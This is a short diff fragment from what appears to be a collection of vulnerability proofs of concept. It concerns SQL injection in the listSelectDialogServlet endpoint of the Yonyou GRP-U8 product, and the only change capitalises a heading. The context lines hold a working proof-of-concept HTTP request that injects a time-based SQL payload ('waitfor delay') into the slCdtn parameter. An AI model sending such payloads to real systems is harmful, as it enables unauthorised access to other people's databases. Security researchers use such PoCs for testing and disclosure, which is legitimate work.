@@ -1,6 +1,6 @@
 ## 用友GRP-U8-listSelectDialogServlet存在SQL注入
 
-## poc
+## POC
 ```
 GET /listSelectDialogServlet?slType=slFZX&slCdtn=1=2;waitfor%20delay%20%270:0:3%27 HTTP/1.1
 Cache-Control: max-age=0
